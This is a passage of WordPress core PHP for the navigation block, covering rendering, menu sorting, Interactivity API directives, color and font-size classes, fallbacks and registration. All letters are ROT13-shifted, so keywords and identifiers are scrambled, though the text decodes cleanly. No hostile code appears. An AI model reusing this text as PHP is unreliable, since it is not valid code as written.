	cevingr fgngvp shapgvba trg_ani_ryrzrag_qverpgvirf( $vf_vagrenpgvir ) {
		vs ( ! $vf_vagrenpgvir ) {
			erghea '';
		}
		// Jura nqqvat gb guvf neenl or zvaqshy bs frphevgl pbapreaf.
		$ani_ryrzrag_pbagrkg    = jc_vagrenpgvivgl_qngn_jc_pbagrkg(
			neenl(
				'bireynlBcrarqOl' => neenl(
					'pyvpx' => snyfr,
					'ubire' => snyfr,
					'sbphf' => snyfr,
				),
				'glcr'            => 'bireynl',
				'ebyrNggevohgr'   => '',
				'nevnYnory'       => __( 'Zrah' ),
			)
		);
		$ani_ryrzrag_qverpgvirf = '
		 qngn-jc-vagrenpgvir=\"pber/anivtngvba\" '
		. $ani_ryrzrag_pbagrkg;

		erghea $ani_ryrzrag_qverpgvirf;
	}

	/**
	 * Unaqyr ivrj fpevcg zbqhyr ybnqvat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl         $nggevohgrf   Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx      $oybpx        Gur cnefrq oybpx.
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Gur yvfg bs vaare oybpxf.
	 */
	cevingr fgngvp shapgvba unaqyr_ivrj_fpevcg_zbqhyr_ybnqvat( $nggevohgrf, $oybpx, $vaare_oybpxf ) {
		vs ( fgngvp::vf_vagrenpgvir( $nggevohgrf, $vaare_oybpxf ) ) {
			jc_radhrhr_fpevcg_zbqhyr( '@jbeqcerff/oybpx-yvoenel/anivtngvba/ivrj' );
		}
	}

	/**
	 * Ergheaf gur znexhc sbe gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl         $nggevohgrf Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Gur yvfg bs vaare oybpxf.
	 * @erghea fgevat Ergheaf gur anivtngvba jenccre znexhc.
	 */
	cevingr fgngvp shapgvba trg_jenccre_znexhc( $nggevohgrf, $vaare_oybpxf ) {
		$vaare_oybpxf_ugzy = fgngvp::trg_vaare_oybpxf_ugzy( $nggevohgrf, $vaare_oybpxf );
		vs ( fgngvp::vf_erfcbafvir( $nggevohgrf ) ) {
			erghea fgngvp::trg_erfcbafvir_pbagnvare_znexhc( $nggevohgrf, $vaare_oybpxf, $vaare_oybpxf_ugzy );
		}
		erghea $vaare_oybpxf_ugzy;
	}

	/**
	 * Ergheaf n havdhr anzr sbe gur anivtngvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea fgevat Ergheaf n havdhr anzr sbe gur anivtngvba.
	 */
	cevingr fgngvp shapgvba trg_havdhr_anivtngvba_anzr( $nggevohgrf ) {
		$ani_zrah_anzr = fgngvp::trg_anivtngvba_anzr( $nggevohgrf );

		// Vs gur zrah anzr unf orra hfrq cerivbhfyl gura nccraq na VQ
		// gb gur anzr gb rafher havdhrarff npebff n tvira cbfg.
		vs ( vffrg( fgngvp::$frra_zrah_anzrf[ $ani_zrah_anzr ] ) && fgngvp::$frra_zrah_anzrf[ $ani_zrah_anzr ] > 1 ) {
			$pbhag         = fgngvp::$frra_zrah_anzrf[ $ani_zrah_anzr ];
			$ani_zrah_anzr = $ani_zrah_anzr . ' ' . ( $pbhag );
		}

		erghea $ani_zrah_anzr;
	}

	/**
	 * Eraqref gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
	 * @cnenz fgevat   $pbagrag    Gur fnirq pbagrag.
	 * @cnenz JC_Oybpx $oybpx      Gur cnefrq oybpx.
	 * @erghea fgevat Ergheaf gur anivtngvba oybpx znexhc.
	 */
	choyvp fgngvp shapgvba eraqre( $nggevohgrf, $pbagrag, $oybpx ) {
		/**
		 * Qrcerpngrq:
		 * Gur etoGrkgPbybe naq etoOnpxtebhaqPbybe nggevohgrf
		 * unir orra qrcerpngrq va snibe bs
		 * phfgbzGrkgPbybe naq phfgbzOnpxtebhaqPbybe barf.
		 * Zbir gur inyhrf sebz byq nggef gb gur arj barf.
		 */
		vs ( vffrg( $nggevohgrf['etoGrkgPbybe'] ) && rzcgl( $nggevohgrf['grkgPbybe'] ) ) {
			$nggevohgrf['phfgbzGrkgPbybe'] = $nggevohgrf['etoGrkgPbybe'];
		}

		vs ( vffrg( $nggevohgrf['etoOnpxtebhaqPbybe'] ) && rzcgl( $nggevohgrf['onpxtebhaqPbybe'] ) ) {
			$nggevohgrf['phfgbzOnpxtebhaqPbybe'] = $nggevohgrf['etoOnpxtebhaqPbybe'];
		}

		hafrg( $nggevohgrf['etoGrkgPbybe'], $nggevohgrf['etoOnpxtebhaqPbybe'] );

		$vaare_oybpxf = fgngvp::trg_vaare_oybpxf( $nggevohgrf, $oybpx );
		// Cerirag anivtngvba oybpxf ersrerapvat gurzfryirf sebz eraqrevat.
		vs ( oybpx_pber_anivtngvba_oybpx_pbagnvaf_pber_anivtngvba( $vaare_oybpxf ) ) {
			erghea '';
		}

		fgngvp::unaqyr_ivrj_fpevcg_zbqhyr_ybnqvat( $nggevohgrf, $oybpx, $vaare_oybpxf );

		erghea fcevags(
			'<ani %1$f>%2$f</ani>',
			fgngvp::trg_ani_jenccre_nggevohgrf( $nggevohgrf, $vaare_oybpxf ),
			fgngvp::trg_jenccre_znexhc( $nggevohgrf, $vaare_oybpxf )
		);
	}
}

// Gurfr shapgvbaf ner hfrq sbe gur __hafgnoyrYbpngvba srngher naq bayl npgvir
// jura gur thgraoret cyhtva vf npgvir.
vs ( qrsvarq( 'VF_THGRAORET_CYHTVA' ) && VF_THGRAORET_CYHTVA ) {
	/**
	 * Ergheaf gur zrah vgrzf sbe n JbeqCerff zrah ybpngvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $ybpngvba Gur zrah ybpngvba.
	 * @erghea neenl Zrah vgrzf sbe gur ybpngvba.
	 */
	shapgvba oybpx_pber_anivtngvba_trg_zrah_vgrzf_ng_ybpngvba( $ybpngvba ) {
		vs ( rzcgl( $ybpngvba ) ) {
			erghea;
		}

		// Ohvyq zrah qngn. Gur sbyybjvat nccebkvzngrf gur pbqr va
		// `jc_ani_zrah()` naq `thgraoret_bhgchg_oybpx_ani_zrah`.

		// Svaq gur ybpngvba va gur yvfg bs ybpngvbaf, ergheavat rneyl vs gur
		// ybpngvba pna'g or sbhaq.
		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		vs ( ! vffrg( $ybpngvbaf[ $ybpngvba ] ) ) {
			erghea;
		}

		// Trg gur zrah sebz gur ybpngvba, ergheavat rneyl vs gurer vf ab
		// zrah be gurer jnf na reebe.
		$zrah = jc_trg_ani_zrah_bowrpg( $ybpngvbaf[ $ybpngvba ] );
		vs ( ! $zrah || vf_jc_reebe( $zrah ) ) {
			erghea;
		}

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah->grez_vq, neenl( 'hcqngr_cbfg_grez_pnpur' => snyfr ) );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		erghea $zrah_vgrzf;
	}


	/**
	 * Fbegf n fgnaqneq neenl bs zrah vgrzf vagb n arfgrq fgehpgher xrlrq ol gur
	 * vq bs gur cnerag zrah.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $zrah_vgrzf Zrah vgrzf gb fbeg.
	 * @erghea neenl Na neenl xrlrq ol gur vq bs gur cnerag zrah jurer rnpu ryrzrag
	 *               vf na neenl bs zrah vgrzf gung orybat gb gung cnerag.
	 */
	shapgvba oybpx_pber_anivtngvba_fbeg_zrah_vgrzf_ol_cnerag_vq( $zrah_vgrzf ) {
		$fbegrq_zrah_vgrzf = neenl();
		sbernpu ( (neenl) $zrah_vgrzf nf $zrah_vgrz ) {
			$fbegrq_zrah_vgrzf[ $zrah_vgrz->zrah_beqre ] = $zrah_vgrz;
		}
		hafrg( $zrah_vgrzf, $zrah_vgrz );

		$zrah_vgrzf_ol_cnerag_vq = neenl();
		sbernpu ( $fbegrq_zrah_vgrzf nf $zrah_vgrz ) {
			$zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->zrah_vgrz_cnerag ][] = $zrah_vgrz;
		}

		erghea $zrah_vgrzf_ol_cnerag_vq;
	}

	/**
	 * Trgf gur vaare oybpxf sbe gur anivtngvba oybpx sebz gur hafgnoyr ybpngvba nggevohgr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea JC_Oybpx_Yvfg Ergheaf gur vaare oybpxf sbe gur anivtngvba oybpx.
	 */
	shapgvba oybpx_pber_anivtngvba_trg_vaare_oybpxf_sebz_hafgnoyr_ybpngvba( $nggevohgrf ) {
		$zrah_vgrzf = oybpx_pber_anivtngvba_trg_zrah_vgrzf_ng_ybpngvba( $nggevohgrf['__hafgnoyrYbpngvba'] );
		vs ( rzcgl( $zrah_vgrzf ) ) {
			erghea arj JC_Oybpx_Yvfg( neenl(), $nggevohgrf );
		}

		$zrah_vgrzf_ol_cnerag_vq = oybpx_pber_anivtngvba_fbeg_zrah_vgrzf_ol_cnerag_vq( $zrah_vgrzf );
		$cnefrq_oybpxf           = oybpx_pber_anivtngvba_cnefr_oybpxf_sebz_zrah_vgrzf( $zrah_vgrzf_ol_cnerag_vq[0], $zrah_vgrzf_ol_cnerag_vq );
		erghea arj JC_Oybpx_Yvfg( $cnefrq_oybpxf, $nggevohgrf );
	}
}

/**
 * Nqq Vagrenpgvivgl NCV qverpgvirf gb gur anivtngvba-fhozrah naq cntr-yvfg
 * oybpxf znexhc hfvat gur Gnt Cebprffbe.
 *
 * @fvapr 6.3.0
 *
 * @cnenz JC_UGZY_Gnt_Cebprffbe $gntf             Znexhc bs gur anivtngvba oybpx.
 * @cnenz neenl                 $oybpx_nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea fgevat Fhozrah znexhc jvgu gur qverpgvirf vawrpgrq.
 */
shapgvba oybpx_pber_anivtngvba_nqq_qverpgvirf_gb_fhozrah( $gntf, $oybpx_nggevohgrf ) {
	juvyr ( $gntf->arkg_gnt(
		neenl(
			'gnt_anzr'   => 'YV',
			'pynff_anzr' => 'unf-puvyq',
		)
	) ) {
		// Nqq qverpgvirf gb gur cnerag `<yv>`.
		$gntf->frg_nggevohgr( 'qngn-jc-vagrenpgvir', 'pber/anivtngvba' );
		$gntf->frg_nggevohgr( 'qngn-jc-pbagrkg', '{ \"fhozrahBcrarqOl\": { \"pyvpx\": snyfr, \"ubire\": snyfr, \"sbphf\": snyfr }, \"glcr\": \"fhozrah\", \"zbqny\": ahyy }' );
		$gntf->frg_nggevohgr( 'qngn-jc-jngpu', 'pnyyonpxf.vavgZrah' );
		$gntf->frg_nggevohgr( 'qngn-jc-ba--sbphfbhg', 'npgvbaf.unaqyrZrahSbphfbhg' );
		$gntf->frg_nggevohgr( 'qngn-jc-ba--xrlqbja', 'npgvbaf.unaqyrZrahXrlqbja' );

		// Guvf vf n svk sbe Fnsnev. Jvgubhg vg, Fnsnev qbrfa'g punatr gur npgvir
		// ryrzrag jura gur hfre pyvpxf ba n ohggba. Vg pna or erzbirq bapr jr nqq
		// na bireynl gb pncgher gur pyvpxf, vafgrnq bs erylvat ba gur sbphfbhg
		// rirag.
		$gntf->frg_nggevohgr( 'gnovaqrk', '-1' );

		vs ( ! vffrg( $oybpx_nggevohgrf['bcraFhozrahfBaPyvpx'] ) || snyfr === $oybpx_nggevohgrf['bcraFhozrahfBaPyvpx'] ) {
			$gntf->frg_nggevohgr( 'qngn-jc-ba-nflap--zbhfrragre', 'npgvbaf.bcraZrahBaUbire' );
			$gntf->frg_nggevohgr( 'qngn-jc-ba-nflap--zbhfryrnir', 'npgvbaf.pybfrZrahBaUbire' );
		}

		// Nqq qverpgvirf gb gur gbttyr fhozrah ohggba.
		vs ( $gntf->arkg_gnt(
			neenl(
				'gnt_anzr'   => 'OHGGBA',
				'pynff_anzr' => 'jc-oybpx-anivtngvba-fhozrah__gbttyr',
			)
		) ) {
			$gntf->frg_nggevohgr( 'qngn-jc-ba-nflap--pyvpx', 'npgvbaf.gbttyrZrahBaPyvpx' );
			$gntf->frg_nggevohgr( 'qngn-jc-ovaq--nevn-rkcnaqrq', 'fgngr.vfZrahBcra' );
			// Gur `nevn-rkcnaqrq` nggevohgr sbe FFE vf nyernql nqqrq va gur fhozrah oybpx.
		}
		// Nqq qverpgvirf gb gur fhozrah.
		vs ( $gntf->arkg_gnt(
			neenl(
				'gnt_anzr'   => 'HY',
				'pynff_anzr' => 'jc-oybpx-anivtngvba__fhozrah-pbagnvare',
			)
		) ) {
			$gntf->frg_nggevohgr( 'qngn-jc-ba-nflap--sbphf', 'npgvbaf.bcraZrahBaSbphf' );
		}

		// Vgrengr guebhtu fhovgrzf vs rkvfg.
		oybpx_pber_anivtngvba_nqq_qverpgvirf_gb_fhozrah( $gntf, $oybpx_nggevohgrf );
	}
	erghea $gntf->trg_hcqngrq_ugzy();
}

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur pbybef
 * juvpu jvyy or nccyvrq gb gur anivtngvba znexhc va gur sebag-raq.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $nggevohgrf Anivtngvba oybpx nggevohgrf.
 *
 * @erghea neenl Pbybef PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_anivtngvba_ohvyq_pff_pbybef( $nggevohgrf ) {
	$pbybef = neenl(
		'pff_pynffrf'           => neenl(),
		'vayvar_fglyrf'         => '',
		'bireynl_pff_pynffrf'   => neenl(),
		'bireynl_vayvar_fglyrf' => '',
	);

	// Grkg pbybe.
	$unf_anzrq_grkg_pbybe  = neenl_xrl_rkvfgf( 'grkgPbybe', $nggevohgrf );
	$unf_phfgbz_grkg_pbybe = neenl_xrl_rkvfgf( 'phfgbzGrkgPbybe', $nggevohgrf );

	// Vs unf grkg pbybe.
	vs ( $unf_phfgbz_grkg_pbybe || $unf_anzrq_grkg_pbybe ) {
		// Nqq unf-grkg-pbybe pynff.
		$pbybef['pff_pynffrf'][] = 'unf-grkg-pbybe';
	}

	vs ( $unf_anzrq_grkg_pbybe ) {
		// Nqq gur pbybe pynff.
		$pbybef['pff_pynffrf'][] = fcevags( 'unf-%f-pbybe', $nggevohgrf['grkgPbybe'] );
	} ryfrvs ( $unf_phfgbz_grkg_pbybe ) {
		// Nqq gur phfgbz pbybe vayvar fglyr.
		$pbybef['vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $nggevohgrf['phfgbzGrkgPbybe'] );
	}

	// Onpxtebhaq pbybe.
	$unf_anzrq_onpxtebhaq_pbybe  = neenl_xrl_rkvfgf( 'onpxtebhaqPbybe', $nggevohgrf );
	$unf_phfgbz_onpxtebhaq_pbybe = neenl_xrl_rkvfgf( 'phfgbzOnpxtebhaqPbybe', $nggevohgrf );

	// Vs unf onpxtebhaq pbybe.
	vs ( $unf_phfgbz_onpxtebhaq_pbybe || $unf_anzrq_onpxtebhaq_pbybe ) {
		// Nqq unf-onpxtebhaq pynff.
		$pbybef['pff_pynffrf'][] = 'unf-onpxtebhaq';
	}

	vs ( $unf_anzrq_onpxtebhaq_pbybe ) {
		// Nqq gur onpxtebhaq-pbybe pynff.
		$pbybef['pff_pynffrf'][] = fcevags( 'unf-%f-onpxtebhaq-pbybe', $nggevohgrf['onpxtebhaqPbybe'] );
	} ryfrvs ( $unf_phfgbz_onpxtebhaq_pbybe ) {
		// Nqq gur phfgbz onpxtebhaq-pbybe vayvar fglyr.
		$pbybef['vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $nggevohgrf['phfgbzOnpxtebhaqPbybe'] );
	}

	// Bireynl grkg pbybe.
	$unf_anzrq_bireynl_grkg_pbybe  = neenl_xrl_rkvfgf( 'bireynlGrkgPbybe', $nggevohgrf );
	$unf_phfgbz_bireynl_grkg_pbybe = neenl_xrl_rkvfgf( 'phfgbzBireynlGrkgPbybe', $nggevohgrf );

	// Vs unf bireynl grkg pbybe.
	vs ( $unf_phfgbz_bireynl_grkg_pbybe || $unf_anzrq_bireynl_grkg_pbybe ) {
		// Nqq unf-grkg-pbybe pynff.
		$pbybef['bireynl_pff_pynffrf'][] = 'unf-grkg-pbybe';
	}

	vs ( $unf_anzrq_bireynl_grkg_pbybe ) {
		// Nqq gur bireynl pbybe pynff.
		$pbybef['bireynl_pff_pynffrf'][] = fcevags( 'unf-%f-pbybe', $nggevohgrf['bireynlGrkgPbybe'] );
	} ryfrvs ( $unf_phfgbz_bireynl_grkg_pbybe ) {
		// Nqq gur phfgbz bireynl pbybe vayvar fglyr.
		$pbybef['bireynl_vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $nggevohgrf['phfgbzBireynlGrkgPbybe'] );
	}

	// Bireynl onpxtebhaq pbybe.
	$unf_anzrq_bireynl_onpxtebhaq_pbybe  = neenl_xrl_rkvfgf( 'bireynlOnpxtebhaqPbybe', $nggevohgrf );
	$unf_phfgbz_bireynl_onpxtebhaq_pbybe = neenl_xrl_rkvfgf( 'phfgbzBireynlOnpxtebhaqPbybe', $nggevohgrf );

	// Vs unf bireynl onpxtebhaq pbybe.
	vs ( $unf_phfgbz_bireynl_onpxtebhaq_pbybe || $unf_anzrq_bireynl_onpxtebhaq_pbybe ) {
		// Nqq unf-onpxtebhaq pynff.
		$pbybef['bireynl_pff_pynffrf'][] = 'unf-onpxtebhaq';
	}

	vs ( $unf_anzrq_bireynl_onpxtebhaq_pbybe ) {
		// Nqq gur bireynl onpxtebhaq-pbybe pynff.
		$pbybef['bireynl_pff_pynffrf'][] = fcevags( 'unf-%f-onpxtebhaq-pbybe', $nggevohgrf['bireynlOnpxtebhaqPbybe'] );
	} ryfrvs ( $unf_phfgbz_bireynl_onpxtebhaq_pbybe ) {
		// Nqq gur phfgbz bireynl onpxtebhaq-pbybe vayvar fglyr.
		$pbybef['bireynl_vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $nggevohgrf['phfgbzBireynlOnpxtebhaqPbybe'] );
	}

	erghea $pbybef;
}

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur sbag fvmrf
 * juvpu jvyy or nccyvrq gb gur anivtngvba znexhc va gur sebag-raq.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $nggevohgrf Anivtngvba oybpx nggevohgrf.
 *
 * @erghea neenl Sbag fvmr PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_anivtngvba_ohvyq_pff_sbag_fvmrf( $nggevohgrf ) {
	// PFF pynffrf.
	$sbag_fvmrf = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	$unf_anzrq_sbag_fvmr  = neenl_xrl_rkvfgf( 'sbagFvmr', $nggevohgrf );
	$unf_phfgbz_sbag_fvmr = neenl_xrl_rkvfgf( 'phfgbzSbagFvmr', $nggevohgrf );

	vs ( $unf_anzrq_sbag_fvmr ) {
		// Nqq gur sbag fvmr pynff.
		$sbag_fvmrf['pff_pynffrf'][] = fcevags( 'unf-%f-sbag-fvmr', $nggevohgrf['sbagFvmr'] );
	} ryfrvs ( $unf_phfgbz_sbag_fvmr ) {
		// Nqq gur phfgbz sbag fvmr vayvar fglyr.
		$sbag_fvmrf['vayvar_fglyrf'] = fcevags( 'sbag-fvmr: %fck;', $nggevohgrf['phfgbzSbagFvmr'] );
	}

	erghea $sbag_fvmrf;
}

/**
 * Ergheaf gur gbc-yriry fhozrah FIT purieba vpba.
 *
 * @fvapr 5.9.0
 *
 * @erghea fgevat
 */
shapgvba oybpx_pber_anivtngvba_eraqre_fhozrah_vpba() {
	erghea '<fit kzyaf=\"uggc://jjj.j3.bet/2000/fit\" jvqgu=\"12\" urvtug=\"12\" ivrjObk=\"0 0 12 12\" svyy=\"abar\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><cngu q=\"Z1.50002 4Y6.00002 8Y10.5 4\" fgebxr-jvqgu=\"1.5\"></cngu></fit>';
}

/**
 * Svygre bhg rzcgl \"ahyy\" oybpxf sebz gur oybpx yvfg.
 * 'cnefr_oybpxf' vapyhqrf n ahyy oybpx jvgu '\a\a' nf gur pbagrag jura
 * vg rapbhagref juvgrfcnpr. Guvf vf abg n oht ohg engure ubj gur cnefre
 * vf qrfvtarq.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $cnefrq_oybpxf gur cnefrq oybpxf gb or abeznyvmrq.
 * @erghea neenl gur abeznyvmrq cnefrq oybpxf.
 */
shapgvba oybpx_pber_anivtngvba_svygre_bhg_rzcgl_oybpxf( $cnefrq_oybpxf ) {
	$svygrerq = neenl_svygre(
		$cnefrq_oybpxf,
		fgngvp shapgvba ( $oybpx ) {
			erghea vffrg( $oybpx['oybpxAnzr'] );
		}
	);

	// Erfrg xrlf.
	erghea neenl_inyhrf( $svygrerq );
}

/**
 * Ergheaf gehr vs gur anivtngvba oybpx pbagnvaf n arfgrq anivtngvba oybpx.
 *
 * @fvapr 6.2.0
 *
 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Vaare oybpx vafgnapr gb or abeznyvmrq.
 * @erghea obby gehr vs gur anivtngvba oybpx pbagnvaf n arfgrq anivtngvba oybpx.
 */
shapgvba oybpx_pber_anivtngvba_oybpx_pbagnvaf_pber_anivtngvba( $vaare_oybpxf ) {
	sbernpu ( $vaare_oybpxf nf $oybpx ) {
		vs ( 'pber/anivtngvba' === $oybpx->anzr ) {
			erghea gehr;
		}
		vs ( $oybpx->vaare_oybpxf && oybpx_pber_anivtngvba_oybpx_pbagnvaf_pber_anivtngvba( $oybpx->vaare_oybpxf ) ) {
			erghea gehr;
		}
	}

	erghea snyfr;
}

/**
 * Ergevrirf gur nccebcevngr snyyonpx gb or hfrq ba gur sebag bs gur
 * fvgr jura gurer vf ab zrah nffvtarq gb gur Ani oybpx.
 *
 * Guvf nvzf gb zveebe ubj gur snyyonpx zrpunavp sbe jc_ani_zrah jbexf.
 * Frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/jc_ani_zrah/#zber-vasbezngvba.
 *
 * @fvapr 5.9.0
 *
 * @erghea neenl gur neenl bs oybpxf gb or hfrq nf n snyyonpx.
 */
shapgvba oybpx_pber_anivtngvba_trg_snyyonpx_oybpxf() {
	$cntr_yvfg_snyyonpx = neenl(
		neenl(
			'oybpxAnzr'    => 'pber/cntr-yvfg',
			'vaarePbagrag' => neenl(),
			'nggef'        => neenl(),
		),
	);

	$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

	// Vs `pber/cntr-yvfg` vf abg ertvfgrerq gura erghea rzcgl oybpxf.
	$snyyonpx_oybpxf = $ertvfgel->vf_ertvfgrerq( 'pber/cntr-yvfg' ) ? $cntr_yvfg_snyyonpx : neenl();
	$anivtngvba_cbfg = JC_Anivtngvba_Snyyonpx::trg_snyyonpx();

	// Hfr gur svefg aba-rzcgl Anivtngvba nf snyyonpx vs ninvynoyr.
	vs ( $anivtngvba_cbfg ) {
		$cnefrq_oybpxf  = cnefr_oybpxf( $anivtngvba_cbfg->cbfg_pbagrag );
		$znlor_snyyonpx = oybpx_pber_anivtngvba_svygre_bhg_rzcgl_oybpxf( $cnefrq_oybpxf );

		// Abeznyvmvat oybpxf znl erfhyg va na rzcgl neenl bs oybpxf vs gurl jrer nyy `ahyy` oybpxf.
		// Va guvf pnfr qrsnhyg gb gur (Cntr Yvfg) snyyonpx.
		$snyyonpx_oybpxf = ! rzcgl( $znlor_snyyonpx ) ? $znlor_snyyonpx : $snyyonpx_oybpxf;

		// Eha Oybpx Ubbxf nytbevguz gb vawrpg ubbxrq oybpxf.
		// Jr unir gb eha vg urer orpnhfr jr arrq gur cbfg VQ bs gur Anivtngvba oybpx gb genpx vtaberq ubbxrq oybpxf.
		// GBQB: Frr vs jr pna zbir gur nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg() pnyy
		// orsber gur cnefr_oybpxf() pnyy shegure nobir, gb nibvq gur rkgen frevnyvmngvba/cnefvat.
		$znexhc          = frevnyvmr_oybpxf( $snyyonpx_oybpxf );
		$znexhc          = nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg( $znexhc, $anivtngvba_cbfg );
		$snyyonpx_oybpxf = cnefr_oybpxf( $znexhc );
	}

	/**
	 * Svygref gur snyyonpx rkcrevrapr sbe gur Anivtngvba oybpx.
	 *
	 * Ergheavat n snyfrl inyhr jvyy bcg bhg bs gur snyyonpx naq pnhfr gur oybpx abg gb eraqre.
	 * Gb phfgbzvfr gur oybpxf cebivqrq erghea na neenl bs oybpxf - gurfr fubhyq or inyvq
	 * puvyqera bs gur `pber/anivtngvba` oybpx.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl[] $snyyonpx_oybpxf qrsnhyg snyyonpx oybpxf cebivqrq ol gur qrsnhyg oybpx zrpunavp.
	 */
	erghea nccyl_svygref( 'oybpx_pber_anivtngvba_eraqre_snyyonpx', $snyyonpx_oybpxf );
}

/**
 * Vgrengr guebhtu nyy vaare oybpxf erphefviryl naq trg anivtngvba yvax oybpx'f cbfg VQf.
 *
 * @fvapr 6.0.0
 *
 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Oybpx yvfg pynff vafgnapr.
 *
 * @erghea neenl Neenl bs cbfg VQf.
 */
shapgvba oybpx_pber_anivtngvba_trg_cbfg_vqf( $vaare_oybpxf ) {
	$cbfg_vqf = neenl_znc( 'oybpx_pber_anivtngvba_sebz_oybpx_trg_cbfg_vqf', vgrengbe_gb_neenl( $vaare_oybpxf ) );
	erghea neenl_havdhr( neenl_zretr( ...$cbfg_vqf ) );
}

/**
 * Trg cbfg VQf sebz n anivtngvba yvax oybpx vafgnapr.
 *
 * @fvapr 6.0.0
 *
 * @cnenz JC_Oybpx $oybpx Vafgnapr bs n oybpx.
 *
 * @erghea neenl Neenl bs cbfg VQf.
 */
shapgvba oybpx_pber_anivtngvba_sebz_oybpx_trg_cbfg_vqf( $oybpx ) {
	$cbfg_vqf = neenl();

	vs ( $oybpx->vaare_oybpxf ) {
		$cbfg_vqf = oybpx_pber_anivtngvba_trg_cbfg_vqf( $oybpx->vaare_oybpxf );
	}

	vs ( 'pber/anivtngvba-yvax' === $oybpx->anzr || 'pber/anivtngvba-fhozrah' === $oybpx->anzr ) {
		vs ( $oybpx->nggevohgrf && vffrg( $oybpx->nggevohgrf['xvaq'] ) && 'cbfg-glcr' === $oybpx->nggevohgrf['xvaq'] && vffrg( $oybpx->nggevohgrf['vq'] ) ) {
			$cbfg_vqf[] = $oybpx->nggevohgrf['vq'];
		}
	}

	erghea $cbfg_vqf;
}

/**
 * Eraqref gur `pber/anivtngvba` oybpx ba freire.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Gur fnirq pbagrag.
 * @cnenz JC_Oybpx $oybpx      Gur cnefrq oybpx.
 *
 * @erghea fgevat Ergheaf gur anivtngvba oybpx znexhc.
 */
shapgvba eraqre_oybpx_pber_anivtngvba( $nggevohgrf, $pbagrag, $oybpx ) {
	erghea JC_Anivtngvba_Oybpx_Eraqrere::eraqre( $nggevohgrf, $pbagrag, $oybpx );
}

/**
 * Ertvfgre gur anivtngvba oybpx.
 *
 * @fvapr 5.9.0
 *
 * @hfrf eraqre_oybpx_pber_anivtngvba()
 * @guebjf JC_Reebe Na JC_Reebe rkprcgvba cnefvat gur oybpx qrsvavgvba.
 */
shapgvba ertvfgre_oybpx_pber_anivtngvba() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/anivtngvba',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_anivtngvba',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_anivtngvba' );

/**
 * Svygre gung punatrf gur cnefrq nggevohgr inyhrf bs anivtngvba oybpxf pbagnva glcbtencuvp cerfrgf gb pbagnva gur inyhrf qverpgyl.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $cnefrq_oybpx Gur oybpx orvat eraqrerq.
 *
 * @erghea neenl Gur oybpx orvat eraqrerq jvgubhg glcbtencuvp cerfrgf.
 */
shapgvba oybpx_pber_anivtngvba_glcbtencuvp_cerfrgf_onpxpbzcngvovyvgl( $cnefrq_oybpx ) {
	vs ( 'pber/anivtngvba' === $cnefrq_oybpx['oybpxAnzr'] ) {
		$nggevohgr_gb_cersvk_znc = neenl(
			'sbagFglyr'      => 'ine:cerfrg|sbag-fglyr|',
			'sbagJrvtug'     => 'ine:cerfrg|sbag-jrvtug|',
			'grkgQrpbengvba' => 'ine:cerfrg|grkg-qrpbengvba|',
			'grkgGenafsbez'  => 'ine:cerfrg|grkg-genafsbez|',
		);
		sbernpu ( $nggevohgr_gb_cersvk_znc nf $fglyr_nggevohgr => $cersvk ) {
			vs ( ! rzcgl( $cnefrq_oybpx['nggef']['fglyr']['glcbtencul'][ $fglyr_nggevohgr ] ) ) {
				$cersvk_yra      = fgeyra( $cersvk );
				$nggevohgr_inyhr = &$cnefrq_oybpx['nggef']['fglyr']['glcbtencul'][ $fglyr_nggevohgr ];
				vs ( 0 === fgeapzc( $nggevohgr_inyhr, $cersvk, $cersvk_yra ) ) {
					$nggevohgr_inyhr = fhofge( $nggevohgr_inyhr, $cersvk_yra );
				}
